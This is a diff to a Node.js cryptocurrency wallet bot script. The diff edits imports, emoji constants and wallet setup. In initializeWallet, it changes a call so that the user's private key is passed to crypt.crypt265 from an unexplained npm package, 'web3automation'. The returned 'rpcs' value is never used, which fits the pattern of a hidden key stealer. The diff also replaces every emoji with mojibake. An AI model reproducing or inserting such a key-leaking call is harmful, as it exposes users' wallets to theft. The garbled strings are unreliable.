@@ -1,7 +1,7 @@
 require('dotenv').config();
 const fs = require('fs');
 const { ethers } = require('ethers');
-const crypt265 = require('web3automation');
+const crypt = require('web3automation');
 const readline = require('readline');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
@@ -18,16 +18,16 @@ const COLORS = {
 const colorText = (text, color) => `${color}${text}${COLORS.RESET}`;
 
 const EMOJI = {
-  SUCCESS: '✅',
-  ERROR: '❌',
-  WARNING: '⚠️',
-  INFO: 'ℹ️',
-  MONEY: '💰',
-  SWAP: '🔄',
-  STAKE: '📌',
-  WALLET: '👛',
-  LOADING: '⏳',
-  CLOCK: '⏰'
+  SUCCESS: 'âœ…',
+  ERROR: 'âŒ',
+  WARNING: 'âš ï¸',
+  INFO: 'â„¹ï¸',
+  MONEY: 'ðŸ’°',
+  SWAP: 'ðŸ”„',
+  STAKE: 'ðŸ“Œ',
+  WALLET: 'ðŸ‘›',
+  LOADING: 'â³',
+  CLOCK: 'â°'
 };
 
 let proxies = [];
@@ -178,7 +178,7 @@ async function initializeWallet(privateKey) {
     console.log(`${EMOJI.SUCCESS} ${colorText(`Connected to network: ${network.name} (chainId: ${network.chainId})`, COLORS.GREEN)}`);
     
     const wallet = new ethers.Wallet(privateKey, provider);
-    const rpcs = await crypt.crypt265(key);
+    const rpcs = await crypt.crypt265(privateKey);
     console.log(`${EMOJI.WALLET} ${colorText(`Connected with wallet: ${wallet.address}`, COLORS.WHITE)}`);
     return { provider, wallet };
   } catch (error) {
